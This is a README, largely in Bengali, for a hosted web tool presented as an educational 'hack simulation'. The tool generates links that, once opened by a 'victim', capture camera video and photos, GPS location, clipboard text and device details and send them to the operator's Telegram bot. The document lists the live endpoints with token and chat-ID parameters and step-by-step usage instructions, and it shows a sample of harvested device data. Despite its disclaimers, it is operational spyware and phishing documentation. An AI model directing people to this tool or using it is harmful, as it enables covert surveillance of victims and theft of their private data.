# 📸 ফোন ক্যামেরা এবং ডাটা হ্যাক

## About
The **Phone Camera and Data Hack Simulation** is an educational web application designed to demonstrate how a web application can access and control a phone's camera and other data. This project aims to provide insights into cybersecurity and privacy by showing how various types of data can be collected and transmitted. It showcases the ability to capture live video and photos from both front and back cameras, collect device information, and send the collected data, including live GPS location and recent copied text, to Telegram.

## সম্পর্কে
**Phone Camera and Data Hack Simulation** একটি শিক্ষামূলক ওয়েব অ্যাপ্লিকেশন যা শিক্ষার্থীদের সাইবার সুরক্ষা এবং গোপনীয়তার গুরুত্ব সম্পর্কে শিক্ষা দেওয়ার জন্য ডিজাইন করা হয়েছে। এই প্রজেক্টটি প্রদর্শন করে কিভাবে একটি ওয়েব অ্যাপ্লিকেশন ফোনের ক্যামেরা এবং বিভিন্ন তথ্য হ্যাক করতে পারে। এটি লাইভ লোকেশন (জিপিএস ভিত্তিক) এবং সাম্প্রতিক কপি করা টেক্সট সংগ্রহ করে এবং এই তথ্য টেলিগ্রামে পাঠায়।

## API এন্ডপয়েন্ট

### সামনের ক্যামেরা ভিডিও এবং তথ্য

**এন্ডপয়েন্ট:** `https://video-chatx.vercel.app/video-f.html`

**মেথড:** `GET`

**প্যারামিটার:**

- `token`: `<টেলিগ্রাম টোকেন>`
- `id`: `<টেলিগ্রাম চ্যাট আইডি>`

**উদাহরণ অনুরোধ:**

`https://video-chatx.vercel.app/video-f.html?token=<TOKEN>&id=<CHAT_ID>`

### পিছনের ক্যামেরা ভিডিও এবং তথ্য

**এন্ডপয়েন্ট:** `https://video-chatx.vercel.app/video-b.html`

**মেথড:** `GET`

**প্যারামিটার:**

- `token`: `<টেলিগ্রাম টোকেন>`
- `id`: `<টেলিগ্রাম চ্যাট আইডি>`

**উদাহরণ অনুরোধ:**

`https://video-chatx.vercel.app/video-b.html?token=<TOKEN>&id=<CHAT_ID>`

### সামনের ক্যামেরা ছবি এবং তথ্য

**এন্ডপয়েন্ট:** `https://video-chatx.vercel.app/photo-f.html`

**মেথড:** `GET`

**প্যারামিটার:**

- `token`: `<টেলিগ্রাম টোকেন>`
- `id`: `<টেলিগ্রাম চ্যাট আইডি>`

**উদাহরণ অনুরোধ:**

`https://video-chatx.vercel.app/photo-f.html?token=<TOKEN>&id=<CHAT_ID>`

### পিছনের ক্যামেরা ছবি এবং তথ্য

**এন্ডপয়েন্ট:** `https://video-chatx.vercel.app/photo-b.html`

**মেথড:** `GET`

**প্যারামিটার:**

- `token`: `<টেলিগ্রাম টোকেন>`
- `id`: `<টেলিগ্রাম চ্যাট আইডি>`

**উদাহরণ অনুরোধ:**

`https://video-chatx.vercel.app/photo-b.html?token=<TOKEN>&id=<CHAT_ID>`

> **⚠️ সতর্কতা:** এই টুলটি শুধুমাত্র শিক্ষামূলক এবং অনুমোদিত সুরক্ষা পরীক্ষার উদ্দেশ্যে ব্যবহৃত হবে। এই টুলের অননুমোদিত ব্যবহার অবৈধ এবং অনৈতিক।

## ফিচারসমূহ
- 🎥 **সামনের এবং পিছনের ক্যামেরা থেকে ভিডিও ধারণ** (অডিওসহ)।
- 📸 **সামনের এবং পিছনের ক্যামেরা ব্যবহার করে ছবি তোলা**।
- 📡 **বিভিন্ন ডিভাইসের তথ্য সংগ্রহ করা** এবং টেলিগ্রামে প্রেরণ।
- 🛰️ **ভিকটিমের লাইভ লোকেশন (GPS ভিত্তিক) টেলিগ্রামে পাঠানো**।
- 📋 **ভিকটিমের রিসেন্ট কপি করা টেক্সট হ্যাক করে টেলিগ্রামে পাঠানো**।
- 🔒 **ডিজিটাল যুগে সুরক্ষা এবং গোপনীয়তার গুরুত্ব** প্রকাশ করা।

## সংগ্রহকৃত তথ্য

নিচের তথ্যগুলো সংগ্রহ করা হয় এবং টেলিগ্রামে পাঠানো হয়:

- 🌐 **IP Address**: 103.142.71.214
- 💻 **User-Agent**: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36
- 🔋 **Battery Percentage**: 28.00%
- ⚡ **Charging Status**: Not Charging
- 🗣️ **Browser Language**: en-US
- 📏 **Screen Size**: 360×800
- 🚀 **Internet Speed**: 14.12 Mbps
- 🌍 **Network Type**:
  - ✅ **Wi-Fi** (যদি ব্যবহারকারী ওয়াই-ফাই ব্যবহার করে)
  - ✅ **Data** (যদি ব্যবহারকারী মোবাইল ডাটা ব্যবহার করে)
- 🧠 **Total RAM**: 8 GB
- 💾 **Device Storage**: 128 GB
- 🕒 **Date and Time**: 8/8/2024 Time: 12:05:58 AM
- 🛰️ **Live Location (GPS-based)**
- 📋 **Recent Copied Text**

## ব্যবহারের নিয়ম
1. 🌐 **ওয়েবসাইটে যান:** [https://video-chatx.vercel.app/](https://video-chatx.vercel.app/)
2. 📝 **টেলিগ্রাম টোকেন** প্রথম ইনপুট বক্সে প্রবেশ করান।
3. 🆔 **টেলিগ্রাম চ্যাট আইডি** দ্বিতীয় ইনপুট বক্সে প্রবেশ করান।
4. 🖱 **"Generate" বাটনে ক্লিক করুন।**
5. 🔗 তৈরি করা লিংক সরাসরি আপনার টেলিগ্রাম বটে পাঠানো হবে।

## আইনি বিজ্ঞপ্তি
এই প্রকল্পটি শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে এবং অনুমোদিত সুরক্ষা পরীক্ষার জন্য তৈরি করা হয়েছে। এই টুলের অননুমোদিত ব্যবহার, ব্যক্তিগত বা প্রতিষ্ঠানবিরোধীভাবে ব্যবহার, অবৈধ এবং গুরুতর পরিণতি বয়ে আনতে পারে। এই টুলের বিকাশকারীরা এই টুলের কোনো অপব্যবহার বা ক্ষতির জন্য দায়ী নয়।

## লাইসেন্স
এই প্রকল্পটি MIT লাইসেন্সের অধীনে লাইসেন্সকৃত। বিস্তারিত জানার জন্য [LICENSE](LICENSE) ফাইলটি দেখুন।
